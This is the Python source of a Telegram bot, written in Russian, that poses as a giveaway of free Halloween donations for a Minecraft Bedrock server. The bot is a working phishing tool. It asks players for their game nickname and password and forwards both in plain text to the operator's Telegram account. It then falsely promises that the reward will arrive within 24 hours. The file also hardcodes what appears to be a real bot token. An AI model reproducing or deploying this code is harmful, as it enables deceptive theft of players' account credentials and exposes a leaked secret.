import sqlite3
import time
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler

# Конфигурация
BOT_TOKEN = "8300222284:AAHt3oT-fxyls9-xv0CNjG4ucFp4Y3vLFmU"
ADMIN_ID = 8000395560  # Ваш ID
CHANNEL_LINK = "https://t.me/pnixmcbe"
CREATOR_USERNAME = "@isnikson"

# Состояния
NICKNAME, PASSWORD = range(2)

# База данных - пересоздаем с правильной структурой
if os.path.exists('users.db'):
    os.remove('users.db')

conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users 
             (user_id INTEGER PRIMARY KEY, banned INTEGER DEFAULT 0)''')
conn.commit()

# Антиспам
user_message_times = {}

def check_spam(user_id):
    now = time.time()
    if user_id not in user_message_times:
        user_message_times[user_id] = []
    
    user_message_times[user_id] = [t for t in user_message_times[user_id] if now - t < 60]
    user_message_times[user_id].append(now)
    
    return len(user_message_times[user_id]) > 10

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Проверка бана
    c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
    user_data = c.fetchone()
    if user_data and user_data[0]:
        await update.message.reply_text("❌ Вы забанены.")
        return
    
    await update.message.reply_text(
        "🎃 *ПОЛУЧИ ХЭЛОУИН ДОНАТ!*\n\n"
        "Сервер: `phoenix-pe.ru`\n"
        "Порт: `19132`\n\n"
        "Нажмите кнопку ниже чтобы начать получение доната!",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🎃 ПОЛУЧИТЬ ДОНАТ", callback_data="get_donate")],
            [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)],
            [InlineKeyboardButton("👤 СОЗДАТЕЛЬ", url=f"tg://resolve?domain={CREATOR_USERNAME[1:]}")]
        ])
    )
    return ConversationHandler.END

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "get_donate":
        await query.message.reply_text("🔹 Введите ваш никнейм:")
        return NICKNAME

async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['nickname'] = update.message.text
    await update.message.reply_text("🔹 Теперь введите ваш пароль:")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text
    nickname = context.user_data['nickname']
    
    # Отправка админу
    admin_text = (
        "🎃 *НОВЫЕ ДАННЫЕ ДЛЯ ДОНАТА*\n\n"
        f"👤 User ID: `{user_id}`\n"
        f"📧 Username: @{update.effective_user.username or 'N/A'}\n"
        f"🔑 Никнейм: `{nickname}`\n"
        f"🔒 Пароль: `{password}`\n"
        f"⏰ Время: `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
    )
    
    await context.bot.send_message(ADMIN_ID, admin_text, parse_mode='Markdown')
    
    await update.message.reply_text(
        "✅ Данные приняты! Донат придет в течение 24 часов.\n\n"
        "📢 Обязательно подпишись на наш канал!",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)]
        ])
    )
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Отменено.")
    return ConversationHandler.END

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Проверка бана
    c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
    user_data = c.fetchone()
    if user_data and user_data[0]:
        return
    
    # Антиспам
    if check_spam(user_id):
        c.execute("INSERT OR REPLACE INTO users (user_id, banned) VALUES (?, ?)", (user_id, 1))
        conn.commit()
        await update.message.reply_text("❌ Вы забанены за спам.")
        return

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    if context.args:
        user_id = int(context.args[0])
        c.execute("INSERT OR REPLACE INTO users (user_id, banned) VALUES (?, ?)", (user_id, 1))
        conn.commit()
        await update.message.reply_text(f"✅ Пользователь {user_id} забанен.")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    if context.args:
        user_id = int(context.args[0])
        c.execute("UPDATE users SET banned=0 WHERE user_id=?", (user_id,))
        conn.commit()
        await update.message.reply_text(f"✅ Пользователь {user_id} разбанен.")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern='^get_donate$')],
        states={
            NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_nickname)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(conv_handler)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    application.run_polling()

if __name__ == '__main__':
    main()
